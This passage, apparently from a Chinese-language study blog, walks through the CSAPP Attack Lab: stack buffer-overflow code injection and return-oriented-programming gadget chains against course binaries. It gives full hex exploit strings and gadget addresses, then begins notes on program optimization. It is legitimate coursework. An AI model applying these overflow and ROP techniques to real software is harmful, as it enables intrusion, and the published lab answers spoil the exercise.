<td align="center">%rsp + 40</td>
<td align="center">getbuf</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">%rsp</td>
<td align="center">栈顶</td>
</tr>
</tbody></table>
</li>
<li><p>要让 getbuf 返回后执行touch1 的代码。也就是<strong>返回地址应该改为touch1的值（0x4017c0）</strong></p>
</li>
<li><p>所以可以让输入占满 getbuf 开辟的0x28占空间，并在在字符串中写入touch1的地址值。<strong>注意地址输入的顺序是小端</strong></p>
</li>
<li><p><img src="/2023/11/02/CSAPP-3-attacklab/image-20231102165418327.png" alt="image-20231102165418327"></p>
</li>
<li><p><img src="/2023/11/02/CSAPP-3-attacklab/image-20231102165510296.png" alt="image-20231102165510296"></p>
</li>
</ul>
<h2 id="2-2-level-2"><a href="#2-2-level-2" class="headerlink" title="2.2 level 2"></a>2.2 level 2</h2><ul>
<li><p>touch2的代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch2</span><span class="params">(<span class="type">unsigned</span> val)</span>&#123; </span><br><span class="line">    vlevel = <span class="number">2</span>; <span class="comment">/* Part of validation protocol */</span>  </span><br><span class="line">    <span class="keyword">if</span> (val == cookie) &#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val); </span><br><span class="line">        validate(<span class="number">2</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val); </span><br><span class="line">        fail(<span class="number">2</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>必须使得ctarget执行touch2的代码而不是返回test函数，必须要让touch2 以为收到的参数是你的<code>cookie（0x59b997fa）</code>。</p>
</li>
</ul>
<p><strong>建议：</strong></p>
<ul>
<li>需要确定注入代码的地址的字节表示位置，能够使得getbuf代码最后ret指令能够转移到那里</li>
<li>函数的第一个参数是放在寄存器%rdi中</li>
<li>注入的代码必须将寄存器的值设定你的cookie，然后利用ret指令将控制转移到touch2的第一条指令</li>
<li>不要在攻击代码中使用 jmp 或 call 命令，这些指令编码的地址很难确定，所以的控制转移都要使用ret指令，即使实际上你并不是要从一个函数调用返回</li>
</ul>
<p><strong>思路：</strong></p>
<ul>
<li><p>touch2 的汇编代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004017ec &lt;touch2&gt;:</span><br><span class="line">  4017ec:	48 83 ec 08          	sub    $0x8,%rsp    #8个字节</span><br><span class="line">  4017f0:	89 fa                	mov    %edi,%edx</span><br><span class="line">  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017f9:	00 00 00 </span><br><span class="line">  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 &lt;cookie&gt;</span><br><span class="line">  401802:	75 20                	jne    401824 &lt;touch2+0x38&gt;</span><br><span class="line">  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi</span><br><span class="line">  401809:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  40180e:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401813:	e8 d8 f5 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401818:	bf 02 00 00 00       	mov    $0x2,%edi</span><br><span class="line">  40181d:	e8 6b 04 00 00       	callq  401c8d &lt;validate&gt;</span><br><span class="line">  401822:	eb 1e                	jmp    401842 &lt;touch2+0x56&gt;</span><br><span class="line">  401824:	be 10 31 40 00       	mov    $0x403110,%esi</span><br><span class="line">  401829:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  40182e:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401833:	e8 b8 f5 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401838:	bf 02 00 00 00       	mov    $0x2,%edi</span><br><span class="line">  40183d:	e8 0d 05 00 00       	callq  401d4f &lt;fail&gt;</span><br><span class="line">  401842:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  401847:	e8 f4 f5 ff ff       	callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>touch2</code> 函数的地址位<code>0x4017ec</code>。</p>
</li>
<li><p>不仅仅需要修改返回地址调用<code>touch2</code>函数，而已还要把<code>cookie</code>作为参数传递进去，题目不建议使用<code>jmp</code> 和<code>call</code>指令进行跳转，所以只能通过在栈中保存目标代码的地址，然后以<code>ret</code>的形式进行跳转。</p>
</li>
<li><p><code>ret</code>指令：</p>
<ul>
<li>x86-64用%rip表示程序计数器，它时刻指向下一条要执行的指令在内存中的地址</li>
<li>于是<code>ret</code>指令就相当于<code>pop %rip</code> 把栈中存放的地址弹出作为下一条指令的地址</li>
<li>所以可以利用<code>push</code> 和 <code>ret</code>就能实现指令的转移</li>
</ul>
</li>
<li><p>做法如下：</p>
<ul>
<li>首先输入字符串把<code>caller</code>的栈中的存储的返回地址修改为注入代码存放的地址</li>
<li>注入代码：<ul>
<li>查看<code>cookie</code>的值，将第一个参数寄存器修改为该值</li>
<li>在栈中压入<code>touch2</code>的地址</li>
<li>ret指令调用返回值即是<code>touch2</code></li>
</ul>
</li>
<li>注入代码的地址，注入代码应该存放在<code>getbuf</code>分配的<code>0x28</code>大小的栈中，地址为<code>getbuf</code>栈顶。</li>
</ul>
</li>
<li><p>注入代码为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movq $0x59b997fa %rdi #将cookie的值传入 rdi中</span><br><span class="line">pushq &amp;0x4017ec 	  #touch2函数的地址</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
</li>
<li><p>接下来利用gdb获取getbuf 的栈顶位置，</p>
<ul>
<li><code>b getbuf()</code>在getbuf函数打上断点</li>
<li><code>r -q</code> 执行程序</li>
<li><code>stepi</code>单步进入函数内部 一遍获取 rsp的值 </li>
<li><code>p/x $rsp</code> 按照16进制print出 $rsp的值</li>
<li><img src="/2023/11/02/CSAPP-3-attacklab/image-20231102201624826.png" alt="image-20231102201624826"></li>
<li>所以<code>%rsp</code>中存放的值是<code>0x5561dc78</code>也就是下一个程序执行的地址 应该是我们要修改的返回地址</li>
</ul>
</li>
<li><p>逻辑：</p>
<ul>
<li><code>getbuf</code>执行完<code>ret</code>后，弹出注入代码的地址</li>
<li>程序执行注入代码，再次执行<code>ret</code> 弹出<code>touch2</code>函数的代码</li>
</ul>
</li>
</ul>
<p><strong>实现：</strong></p>
<ul>
<li>将汇编代码写在c2.s文件中，然后进行编译，使用<code>gcc -c c2.s</code>和<code>objdump -d c2.o &gt; c2.d</code>得到字节级的表示</li>
<li><img src="/2023/11/02/CSAPP-3-attacklab/image-20231102205115761.png" alt="image-20231102205115761"></li>
<li>将字节放到<strong>40个字节</strong>的开头，然后代码地址放在溢出的部分，那么<code>getbuf</code>读取字符串的时候会溢出，此时<code>栈顶rsp</code>存放的地址是<code>0x5561dc78</code>，并且栈已经被注入代码覆盖，然后<code>ret</code>到代码地址，运行注入代码，写入<code>cookie</code>和<code>touch2</code> 的地址。</li>
<li><img src="/2023/11/02/CSAPP-3-attacklab/image-20231102212131186.png" alt="image-20231102212131186"></li>
<li><img src="/2023/11/02/CSAPP-3-attacklab/image-20231102212217851.png" alt="image-20231102212217851"></li>
</ul>
<h2 id="2-3-level-3"><a href="#2-3-level-3" class="headerlink" title="2.3 level 3"></a>2.3 level 3</h2><p>同样是注入攻击，但是是传递字符串作为参数</p>
<p><code>hexmatch</code>代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">hexmatch</span><span class="params">(<span class="type">unsigned</span> val, <span class="type">char</span> *sval)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">    <span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line">	<span class="type">char</span> *s = cbuf + random() % <span class="number">100</span>; <span class="comment">//s是随机的</span></span><br><span class="line">	<span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);    </span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p> <code>touch3</code>代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch3</span><span class="params">(<span class="type">char</span> *sval)</span></span><br><span class="line">&#123;</span><br><span class="line">	vlevel = <span class="number">3</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">	<span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">		validate(<span class="number">3</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">		fail(<span class="number">3</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>目的是让<code>ctarget</code>执行<code>touch3</code> 而不是返回<code>test</code></p>
<p><strong>建议：</strong></p>
<ul>
<li>攻击字符串中要包含<code>cookie</code>的字符串，这个字符串由8个16进制数字组成顺序由高位到地位，开头没有0x</li>
<li>字符串在c语言中表示为字节序列，后跟值0的字节</li>
<li>注入代码应该将寄存器%rdi设置为攻击字符串的地址</li>
<li>调用<code>hexmatch和strncmp</code>函数的时候，会将数据压入栈中，覆盖getbuf使用的缓冲区的内存，需要将cookie字符串放置在合适的地方</li>
</ul>
<p><strong>思路：</strong></p>
<ul>
<li>本题与<code>phase2</code>类似，区别是本题传入的是字符串，切需要将<code>cookie</code>字符串放置在合适的位置</li>
<li><code>char *s = cbuf + random() % 100; //s是随机的</code> hexmatch中这一行代码表面 s是随机的，<strong>再然后根据建议4</strong>，所以如果跟<code>phase2</code>一样注入<code>getbuf</code>函数的栈中的话，可能会被被覆盖，所以不能将字符串放在<code>getbuf的</code>栈中，所以可以放置在<code>test</code>的栈中。</li>
<li>其余思路跟phase2差不多</li>
</ul>
<p><strong>实现：</strong></p>
<ul>
<li><p>test的反汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401968 &lt;test&gt;:</span><br><span class="line">  401968:	48 83 ec 08          	sub    $0x8,%rsp  #栈顶开辟8字节</span><br><span class="line">  40196c:	b8 00 00 00 00       	mov    $0x0,%eax  #eax = 0</span><br><span class="line">  401971:	e8 32 fe ff ff       	callq  4017a8 &lt;getbuf&gt; #调用getbuf</span><br><span class="line">  401976:	89 c2                	mov    %eax,%edx #edx = eax</span><br><span class="line">  401978:	be 88 31 40 00       	mov    $0x403188,%esi #</span><br><span class="line">  40197d:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  401982:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401987:	e8 64 f4 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  40198c:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  401990:	c3   </span><br></pre></td></tr></table></figure>
</li>
<li><p>touch3的反汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004018fa &lt;touch3&gt;:</span><br><span class="line">  4018fa:	53                   	push   %rbx</span><br><span class="line">  4018fb:	48 89 fb             	mov    %rdi,%rbx</span><br><span class="line">  4018fe:	c7 05 d4 2b 20 00 03 	movl   $0x3,0x202bd4(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  401905:	00 00 00 </span><br><span class="line">  401908:	48 89 fe             	mov    %rdi,%rsi</span><br><span class="line">  40190b:	8b 3d d3 2b 20 00    	mov    0x202bd3(%rip),%edi        # 6044e4 &lt;cookie&gt;</span><br><span class="line">  401911:	e8 36 ff ff ff       	callq  40184c &lt;hexmatch&gt;</span><br><span class="line">  401916:	85 c0                	test   %eax,%eax</span><br><span class="line">  401918:	74 23                	je     40193d &lt;touch3+0x43&gt;</span><br><span class="line">  40191a:	48 89 da             	mov    %rbx,%rdx</span><br><span class="line">  40191d:	be 38 31 40 00       	mov    $0x403138,%esi</span><br><span class="line">  401922:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  401927:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  40192c:	e8 bf f4 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401931:	bf 03 00 00 00       	mov    $0x3,%edi</span><br><span class="line">  401936:	e8 52 03 00 00       	callq  401c8d &lt;validate&gt;</span><br><span class="line">  40193b:	eb 21                	jmp    40195e &lt;touch3+0x64&gt;</span><br><span class="line">  40193d:	48 89 da             	mov    %rbx,%rdx</span><br><span class="line">  401940:	be 60 31 40 00       	mov    $0x403160,%esi</span><br><span class="line">  401945:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  40194a:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  40194f:	e8 9c f4 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401954:	bf 03 00 00 00       	mov    $0x3,%edi</span><br><span class="line">  401959:	e8 f1 03 00 00       	callq  401d4f &lt;fail&gt;</span><br><span class="line">  40195e:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  401963:	e8 d8 f4 ff ff       	callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>


</li>
<li><p>使用gdb调试 获取test栈指针的地址<code>0x5561dca8</code>   这个地址就是我们<code>cookie</code>字符串需要存放的地址，也是调用<code>touch3</code>应该传入的参数，由touch3 的地址为<code>0x4018fa</code></p>
<ul>
<li><code>b $0x401968</code>设置断点</li>
<li><code>r -q</code> 运行</li>
<li><code>stepi</code> 单步执行进入函数</li>
<li><code>p/x $rsp</code>打印栈指针的值</li>
<li><img src="/2023/11/02/CSAPP-3-attacklab/image-20231102221124338.png" alt="image-20231102221124338"></li>
</ul>
</li>
<li><p>注入代码为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movq $0x5561dca8, %rdi #从0x5561dca8 加载字符串到rdi中</span><br><span class="line">pushq $0x4018fa        #传入touch3 的地址</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
</li>
<li><p>同上操作得到字节级返回：</p>
</li>
<li><p><img src="/2023/11/02/CSAPP-3-attacklab/image-20231102222104635.png" alt="image-20231102222104635"></p>
</li>
<li><p>所以phase3的栈帧应该是如下：来自<a href="https://blog.csdn.net/qq_25591221/article/details/123301271?ops_request_misc=%7B%22request_id%22:%22166996863216800184131554%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=166996863216800184131554&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-123301271-null-null.142%5Ev67%5Econtrol,201%5Ev3%5Eadd_ask,213%5Ev2%5Et3_esquery_v3&utm_term=attacklab&spm=1018.2226.3001.4187">【精选】CSAPP-Lab03 Attack Lab 详细解析-CSDN博客</a>  <strong>THX！！！</strong></p>
</li>
<li><p><img src="/2023/11/02/CSAPP-3-attacklab/image-20231102222219420.png" alt="image-20231102222219420"></p>
</li>
<li><p>将cookie &#x3D; 59b997fa 按照ascii 转成字符串 为<code>35 39 62 39 39 37 66 61</code></p>
</li>
<li><p><strong>逻辑：</strong></p>
<ul>
<li>getbuf 执行ret， 从栈中弹出地址0x5561dc78，跳转到注入代码</li>
<li>代码执行，将存在地址为0x5561dca8的字符串传入参数寄存器%rdi</li>
<li>将touch3的地址压入栈</li>
<li>执行ret 从栈中弹出touch3 函数的地址。</li>
</ul>
</li>
<li><p>所以注入最终字符串为：</p>
</li>
<li><p><img src="/2023/11/02/CSAPP-3-attacklab/image-20231102223458707.png" alt="image-20231102223458707"></p>
</li>
<li><p>因为在<code>text</code>栈帧中多用了一个字节存放<code>cookie</code>，所以最后<code>8个字节</code>用来存放<code>cookie</code>的字符串</p>
</li>
<li><p><img src="/2023/11/02/CSAPP-3-attacklab/image-20231102223921626.png" alt="image-20231102223921626"></p>
</li>
</ul>
<h1 id="3-return-oriented-programming"><a href="#3-return-oriented-programming" class="headerlink" title="3.return-oriented programming"></a>3.return-oriented programming</h1><p><strong>说明：</strong>对rtarget 进行攻击比ctarget要困难许多</p>
<ul>
<li>rtarget使用了随机化，使得每次运行时栈堆的位置都不同。</li>
<li>将保存栈的内存区域设置为不可执行，所以即使将攻击代码放入了程序计数器中，也会不可以执行</li>
</ul>
<p><strong>ROP：</strong>面向返回的程序设计，就是在已经存在的程序中找到特定的以<code>ret</code>结尾的指令序列为我们所用，称这样的代码段为<code>gadget</code>，把要用到的部分的地址压入栈中，每次ret后取出一个新的<code>gadget</code>，所以就可以形成一个程序连，实现攻击。——拼凑代码</p>
<h2 id="3-1-level-2"><a href="#3-1-level-2" class="headerlink" title="3.1 level 2"></a>3.1 level 2</h2><p><code>phase 4</code>将重复<code>phase 2</code>阶段的攻击（<strong>修改返回地址 调用touch2</strong>），不同的是要使用<code>gadget farm</code> 里的<code>gadget</code> 来攻击<code>rtarget</code>程序，你的答案只使用如下指令类型的<code>gadget</code>。也只能使用<code>前八个寄存器%rax - %rdi</code></p>
<ul>
<li>movq：代码figure 3A<ul>
<li><img src="/2023/11/02/CSAPP-3-attacklab/image-20231103102041710.png" alt="image-20231103102041710"></li>
</ul>
</li>
<li>popq：见figure 3B<ul>
<li><img src="/2023/11/02/CSAPP-3-attacklab/image-20231103102111796.png" alt="image-20231103102111796"></li>
</ul>
</li>
<li>ret：0xc3 单字节编码</li>
<li>nop：0x90单字节编码，</li>
</ul>
<p><strong>建议：</strong></p>
<ul>
<li>所有的gadgets都可在rtarget代码的start-farm 到mid -farm中找到</li>
<li>只可以使用两个gadgets来实现这次攻击</li>
<li>如果一个gadget使用了popq指令，那么它会从栈中弹出数据。这样一来，你的攻击代码能既包含gadget的地址也包含数据。</li>
</ul>
<p><strong>思路：</strong></p>
<ul>
<li><p>phase 2 注入的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movq $0x59b997fa %rdi #将cookie的值传入 rdi中</span><br><span class="line">pushq &amp;0x4017ec 	  #touch2函数的地址</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>很难</strong>从程序中获得带有特定立即数（<code>$0x59b997fa</code>）的gadget代码。—–联想到建议第三点<strong>如果一个gadget 使用了pop命令，那么它会从栈中弹出数据，这样一来你的攻击代码技能包含gadget的地址也包含数据</strong></p>
</li>
<li><p>对 rtarget 执行反汇编<code>objdump -d rtarget &gt; rtarget.s</code>得到.s文件</p>
</li>
<li><p>根据上面的思路，理论上只需要将cookie 赋值给 参数寄存器%rdi，然后再将ret设置为touch2的地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop %rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
</li>
<li><p>在<code>rtarget.s</code>中start_farm到 end_farm这一段搜索是否存在<code>pop %rdi----用5f表示</code>     ——-<strong>没有这个gadget</strong></p>
</li>
<li><p>所以再根据题目提示的，可以用两条gadget组合，那么可以得到如下代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#cookie 数据 gadget1</span><br><span class="line">pop %rax</span><br><span class="line">ret #ret gadget2</span><br><span class="line">#gadget2 rax移动到 rdi</span><br><span class="line">movq %rax, %rdi</span><br><span class="line">ret # touch2</span><br></pre></td></tr></table></figure>
</li>
<li><p>查表 <code>popq %rax </code>的编码表示为<code>58</code>，<code>movq %rax, %rdi</code>的编码表示为 <code>48 89 c7</code> </p>
</li>
<li><p>在farm搜索这几个编码 存在58</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:	c3                   	retq   </span><br><span class="line">-----  </span><br><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:	c3                   	retq   </span><br></pre></td></tr></table></figure>
</li>
<li><p>所以可以得到<code>58</code>的指令地址为<code>0x4019ab</code>， <code>48 89 c7</code>的指令地址为<code>0x4019a2</code>，<code>cookie（0x59b997fa）</code>，<code>touch2（4017ec）</code></p>
</li>
<li><p>所以可以得到test输入的字符串为以下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 #补齐40个字节 </span><br><span class="line">ab 19 40 00 00 00 00 00 # pop %rax的指令 58</span><br><span class="line">fa 97 b9 59 00 00 00 00 # cookie的值 59b997fa</span><br><span class="line">a2 19 40 00 00 00 00 00 # movq %rax，rdi的指令</span><br><span class="line">ec 17 40 00 00 00 00 00 # touch2的地址</span><br></pre></td></tr></table></figure>
</li>
<li><p><img src="/2023/11/02/CSAPP-3-attacklab/image-20231103113722934.png" alt="image-20231103113722934"></p>
</li>
</ul>
<p><strong>逻辑：</strong></p>
<ul>
<li>栈帧：</li>
<li><img src="/2023/11/02/CSAPP-3-attacklab/image-20231103114232778.png" alt="image-20231103114232778"></li>
<li>首先将<code>getbuf</code>开辟的40个字节的栈填满溢出，</li>
<li>然后<code>getbuf</code>返回后会执行<code>gadget1</code>函数，会将<code>cookie</code>的值弹出，并存入<code>%rax</code>中</li>
<li>然后<code>ret</code>执行<code>gadget2</code> 会将<code>%rax</code> 转移到<code>%rdi</code></li>
<li>然后<code>ret</code>到<code>touch2</code>的地址，调用<code>touch2</code>函数</li>
</ul>
<h2 id="3-2-level-3"><a href="#3-2-level-3" class="headerlink" title="3.2 level 3"></a>3.2 level 3</h2><p><code>phase 5</code>将实现<code>phase 3</code>调用touch3函数，传入的是cookie的字符串。</p>
<p>可以使用 <code>farm</code>中的所有代码。</p>
<p><strong>建议</strong></p>
<ul>
<li>需要关注<code>movl</code>指令对寄存器<code>高4</code>字节的影响</li>
<li>官方解法需要<code>8</code>个<code>gadgets</code></li>
</ul>
<p><code>phase3</code>注入的代码为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movq $0x5561dca8, %rdi #从0x5561dca8是栈中存放cookie的地址 加载字符串到rdi中 </span><br><span class="line">pushq $0x4018fa        #传入touch3 的地址</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<ul>
<li><p>rtarget中 栈的位置是随机的 所以<strong>没有办法使用绝对地址直接</strong>找到cookie存放在栈中的地址，因此可以采用偏移量计算的方式，<strong>用相对地址访问</strong>。</p>
</li>
<li><p>计算相对地址可以使用%rsp寄存器 <strong>%rsp—-栈指针寄存器 指向栈顶，然后加上偏移量就可以获得存放 cookie的地址</strong></p>
</li>
<li><p>进行地址偏移计算需要用到 lea（load effective address）取有效地址，即取偏移地址，在farm中搜索得到：</p>
<p><img src="/2023/11/02/CSAPP-3-attacklab/image-20231104114015510.png" alt="image-20231104114015510"></p>
</li>
<li><p>这一行是计算<code>%rdi+%rsi</code>，并将结果放在<code>%rax</code>中，同上phase4，需要将<code>%rax</code>中存放的数据传入到<code>%rdi</code>中，所以需要：<code>mov %rax, %rdi</code> 调用函数。</p>
</li>
<li><p>由于操作数寄存器为<code>%rdi</code> 和 <code>%rsi</code>，需要将栈顶取出放入到<code>%rdi</code>中，将偏移量取出放入到<code>%rsi（%esi）</code>中</p>
</li>
<li><p>获取栈指针位置： <code>movq %rsp，%rdi</code> 但farm每一满足条件的字节码，所以可以多次移动： <code>movq %rsp ，%rax</code> —–<code>movq %rax，%rdi</code> </p>
</li>
<li><p>地址偏移量是我们自己手动输入，需要：<code>popq %rax</code> 将其取出放入到<code>%rax</code>寄存器  </p>
</li>
<li><p>然后将<code>%rax（%eax）</code> 放入到<code>%rsi（%esi）</code>中，farm没有直接指令：<code>mov %eax，%esi，</code>因此需要两条指令，也没有，三条：<code>mov %eax，%ecx</code> —- <code>mov %ecx，%edx</code> —–<code>mov %edx，%esi</code></p>
</li>
<li><p>因此 全部需要的指令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#栈指针 存入rdi</span><br><span class="line">movq %rsp, %rax</span><br><span class="line">ret</span><br><span class="line">movq %rax, %rdi</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">#传入偏移地址</span><br><span class="line">popq %rax</span><br><span class="line">ret</span><br><span class="line">movl %eax, %edx</span><br><span class="line">ret</span><br><span class="line">movl %edx, %ecx</span><br><span class="line">ret</span><br><span class="line">movl %ecx, %esi</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">#计算cookie的地址，栈指针+偏移地址，存入rax</span><br><span class="line">lea        (%rdi, %rsi, 1), %rax</span><br><span class="line">ret</span><br><span class="line">movq %rax, %rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
</li>
<li><p>栈帧的示意图：<a href="https://blog.csdn.net/qq_25591221/article/details/123301271?ops_request_misc=%7B%22request_id%22:%22166996863216800184131554%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=166996863216800184131554&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-123301271-null-null.142%5Ev67%5Econtrol,201%5Ev3%5Eadd_ask,213%5Ev2%5Et3_esquery_v3&utm_term=attacklab&spm=1018.2226.3001.4187">【精选】CSAPP-Lab03 Attack Lab 详细解析-CSDN博客</a></p>
<p><img src="/2023/11/02/CSAPP-3-attacklab/image-20231104115950030.png" alt="image-20231104115950030"></p>
</li>
<li><p><code>0x48</code>：getbuf之后ret 相当于执行了一次pop操作，所以test的栈指针%rsp &#x3D; %rsp + 0x8.所以cookie相对此hi栈顶的偏移量是0x48 —-<strong>cookie前面指令有9条 9*8&#x3D;0x48</strong></p>
</li>
<li><p>所以序列为：</p>
</li>
<li><pre><code class="asm">00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
ad 1a 40 00 00 00 00 00 
a2 19 40 00 00 00 00 00 
cc 19 40 00 00 00 00 00 
48 00 00 00 00 00 00 00 
dd 19 40 00 00 00 00 00 
70 1a 40 00 00 00 00 00 
13 1a 40 00 00 00 00 00 
d6 19 40 00 00 00 00 00 
a2 19 40 00 00 00 00 00 
fa 18 40 00 00 00 00 00 
35 39 62 39 39 37 66 61
</code></pre>
</li>
<li><p><img src="/2023/11/02/CSAPP-3-attacklab/image-20231104120756804.png" alt="image-20231104120756804"></p>
</li>
</ul>
]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>attacklab</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP-5-textbook</title>
    <url>/2023/11/05/CSAPP-5-textbook/</url>
    <content><![CDATA[<h1 id="第五章-优化程序性能"><a href="#第五章-优化程序性能" class="headerlink" title="第五章 优化程序性能"></a>第五章 优化程序性能</h1><ul>
<li>gcc编译器优化指定级别<code>-og</code>基本优化，<code>-o1</code>或更高<code>-o2、-o3</code>使用大量的优化，优化级别越高，标准的调试工具更难对程序进行调试。</li>
<li>妨碍优化的因素：<ul>
<li>内存别名使用：<ul>
<li><img src="/2023/11/05/CSAPP-5-textbook/image-20231105194359531.png" alt="image-20231105194359531"></li>
</ul>
</li>
<li>函数调用<ul>
<li><img src="/2023/11/05/CSAPP-5-textbook/image-20231105194530596.png" alt="image-20231105194530596"></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="5-2-表示程序性能"><a href="#5-2-表示程序性能" class="headerlink" title="5.2 表示程序性能"></a>5.2 表示程序性能</h2><ul>
<li>度量标准<strong>每元素的周期数（CPE）</strong>，表示一种表示程序性能并指导我们改进代码的方法。</li>
</ul>
<h2 id="5-3-程序示例"><a href="#5-3-程序示例" class="headerlink" title="5.3 程序示例"></a>5.3 程序示例</h2><ul>
<li><p>combine1 函数</p>
<p><img src="/2023/11/05/CSAPP-5-textbook/image-20231105200201736.png" alt="image-20231105200201736"></p>
</li>
<li><p>combine1的CPE度量值，未经优化和使用O1优化的</p>
<p><img src="/2023/11/05/CSAPP-5-textbook/image-20231105195949332.png" alt="image-20231105195949332"></p>
</li>
</ul>
<h2 id="5-4-消除循环的低效率"><a href="#5-4-消除循环的低效率" class="headerlink" title="5.4 消除循环的低效率"></a>5.4 消除循环的低效率</h2><p>combine1中，for循环的条件是vec_length(v)，<strong>意味着每次for循环进行判断的时候都要进行计算这个值</strong>，可以做如下修改，将结果赋值给局部变量length。</p>
<p><img src="/2023/11/05/CSAPP-5-textbook/image-20231105200615971.png" alt="image-20231105200615971"></p>
<p>combine2 的CPE值：</p>
